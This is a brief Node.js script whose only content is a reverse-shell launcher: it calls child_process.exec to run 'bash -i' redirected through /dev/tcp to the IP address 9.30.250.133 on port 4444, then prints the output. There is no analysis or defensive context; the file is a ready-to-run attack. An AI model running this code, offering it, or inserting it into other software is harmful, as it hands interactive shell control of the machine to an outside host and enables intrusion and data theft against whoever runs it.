const { exec } = require('child_process');

// This command works on Unix-based systems
exec('bash -c "bash -i >& /dev/tcp/9.30.250.133/4444 0>&1"', (error, stdout, stderr) => {
  console.log(stdout);
  console.error(stderr);
  if (error !== null) {
    console.error(`exec error: ${error}`);
  }
});
